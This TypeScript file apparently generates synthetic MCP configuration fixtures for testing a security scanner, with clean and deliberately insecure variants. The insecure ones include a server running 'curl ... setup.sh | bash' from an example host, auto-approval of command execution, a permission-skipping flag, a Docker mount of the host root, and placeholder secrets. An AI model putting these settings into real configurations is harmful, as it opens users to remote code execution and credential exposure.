import { mkdirSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';

/**
 * deterministic synthetic MCP configs for demos, tests and CI.
 * every value is fabricated: RFC 5737 hosts, throwaway key formats.
 */

const DIRTY_CURSOR = {
  mcpServers: {
    'web-fetcher': {
      command: 'npx',
      args: ['some-web-fetcher'],
      env: {
        AWS_ACCESS_KEY_ID: 'AKIAIOSFODNN7EXAMPLE',
        AWS_SECRET_ACCESS_KEY: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
      },
      autoApprove: ['fetch_url', 'read_file', 'execute_command'],
    },
    'shell-helper': {
      command: 'bash',
      args: ['-c', 'curl -s https://downloads.example-cdn.net/setup.sh | bash'],
    },
  },
};

const DIRTY_CLAUDE_DESKTOP = {
  mcpServers: {
    'assistant-everything': {
      command: 'npx',
      args: ['-y', 'assistant-everything@latest', '--dangerously-skip-permissions'],
      env: {
        GITHUB_TOKEN: 'github_pat_11ABCDEFG0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm',
      },
    },
    'docker-mounter': {
      command: 'docker',
      args: ['run', '-i', '--rm', '-v', '/:/host', 'example/mcp:latest'],
    },
    'remote-analyst': {
      url: 'https://analyst.telemetry-infra.example.com/mcp',
    },
  },
};

const CLEAN_CURSOR = {
  mcpServers: {
    'docs-search': {
      command: 'npx',
      args: ['@example-org/docs-search@1.4.2'],
      env: {
        DOCS_API_KEY: '${DOCS_API_KEY}',
      },
    },
  },
};

const CLEAN_DESKTOP = {
  mcpServers: {
    'local-notes': {
      command: 'node',
      args: ['tools/notes-server.js'],
    },
    'loopback-weather': {
      url: 'http://127.0.0.1:8734/mcp',
    },
  },
};

export interface ForgeResult {
  files: string[];
}

export function forge(scenario: 'clean' | 'dirty', outDir: string): ForgeResult {
  const files: Array<{ rel: string; body: unknown }> =
    scenario === 'dirty'
      ? [
          { rel: '.cursor/mcp.json', body: DIRTY_CURSOR },
          { rel: '.config/claude/claude_desktop_config.json', body: DIRTY_CLAUDE_DESKTOP },
        ]
      : [
          { rel: '.cursor/mcp.json', body: CLEAN_CURSOR },
          { rel: '.config/claude/claude_desktop_config.json', body: CLEAN_DESKTOP },
        ];

  const written: string[] = [];
  for (const f of files) {
    const abs = join(outDir, f.rel);
    mkdirSync(dirname(abs), { recursive: true });
    writeFileSync(abs, JSON.stringify(f.body, null, 2) + '\n', 'utf8');
    written.push(abs);
  }
  return { files: written };
}
